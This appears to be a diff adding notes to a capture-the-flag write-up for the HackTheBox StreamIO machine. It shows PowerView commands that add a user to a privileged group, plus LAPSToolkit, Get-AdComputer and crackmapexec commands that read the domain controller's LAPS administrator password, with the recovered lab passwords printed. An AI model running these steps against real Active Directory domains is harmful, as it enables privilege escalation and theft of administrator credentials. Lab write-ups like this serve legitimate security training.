@@ -430,6 +430,8 @@ Clicking that “1” shows that JDgodd has ownership and WriteOwner on the Core
 Expanding out from Core Staff and setup the DC.STREAMIO.HTB as ending node while the JDgodd as statintg node, it has ReadLAPSPassword on the DC computer object:
 
 ##### Add JDgodd to the CORE STAFF group
+Optional `Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity JDgodd -Cred $cred` as JDgodd has WriteOwner ACL attributed to their account, we can also set JDgodd as the domain object owner of `CORE STAFF` using `Set-DomainObjectOwner`.
+
 ```cmd
 *Evil-WinRM* PS C:\Users\nikk37\Documents> upload PowerView.ps1
 *Evil-WinRM* PS C:\Users\nikk37\Documents> Import-Module .\PowerView.ps1                 
@@ -437,8 +439,8 @@ Info: Upload successful
 
 *Evil-WinRM* PS C:\Users\nikk37\Documents> $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
 *Evil-WinRM* PS C:\Users\nikk37\Documents> $Cred = New-Object System.Management.Automation.PSCredential('STREAMIO.HTB\JDGODD', $SecPassword)
-*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "CORE STAFF" -PrincipalIdentity "JDGODD"
-*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDGODD' -Credential $Cred
+*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "CORE STAFF" -PrincipalIdentity "JDGODD" -> optional to use the domain "StreamIO\JDgodd"
+*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDGODD' -Credential $Cred -> optional to use the domain "StreamIO\JDgodd"
 *Evil-WinRM* PS C:\Users\nikk37\Documents> Get-DomainGroupMember -Identity 'CORE STAFF'
 
 GroupDomain             : streamIO.htb
@@ -482,6 +484,8 @@ The command completed successfully.
 1. cme
 2. ldapsearch
 3. pyLAPS.py
+4. LAPSToolkit.ps1  <- One thing for the windows way is that may require another session after the powerview
+5. Get-AdComputer   <- It got conflicts otherwise 
 
 ```bash
 crackmapexec smb streamio.htb -u JDgodd -p JDg0dd1s@d0p3cr3@t0r --laps --ntds
@@ -514,3 +518,27 @@ python pyLAPS.py --action get -u 'JDgodd' -d 'streamio.htb' -p 'JDg0dd1s@d0p3cr3
 
 evil-winrm -i $IP -u administrator -p '@[C21{#FZVH,n!'
   ```
+
+```cmd
+*Evil-WinRM* PS C:\Users\nikk37\Documents> . .\LAPSToolkit.ps1
+*Evil-WinRM* PS C:\Users\nikk37\Documents> Get-LAPSComputers -Credential $Cred1
+
+ComputerName    Password       Expiration
+------------    --------       ----------
+DC.streamIO.htb e4k&b1a#k5.t7P 12/05/2023 22:35:24
+
+
+*Evil-WinRM* PS C:\Users\nikk37\Documents> Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $Cred1
+
+
+DistinguishedName : CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
+DNSHostName       : DC.streamIO.htb
+Enabled           : True
+ms-Mcs-AdmPwd     : e4k&b1a#k5.t7P
+Name              : DC
+ObjectClass       : computer
+ObjectGUID        : 8c0f9a80-aaab-4a78-9e0d-7a4158d8b9ee
+SamAccountName    : DC$
+SID               : S-1-5-21-1470860369-1569627196-4264678630-1000
+UserPrincipalName :
+```
